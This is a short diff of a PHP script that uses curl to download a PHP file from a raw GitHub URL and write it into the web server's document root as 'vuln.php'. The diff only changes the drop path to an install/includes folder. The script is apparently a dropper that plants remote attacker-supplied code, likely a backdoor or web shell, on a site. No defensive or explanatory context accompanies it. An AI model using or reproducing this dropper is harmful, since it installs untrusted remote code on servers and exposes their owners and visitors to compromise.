@@ -9,7 +9,7 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$check = $_SERVER['DOCUMENT_ROOT'] . "/includes/vuln.php" ;
+$check = $_SERVER['DOCUMENT_ROOT'] . "/install/includes/vuln.php" ;
 $text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/settings_auto.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
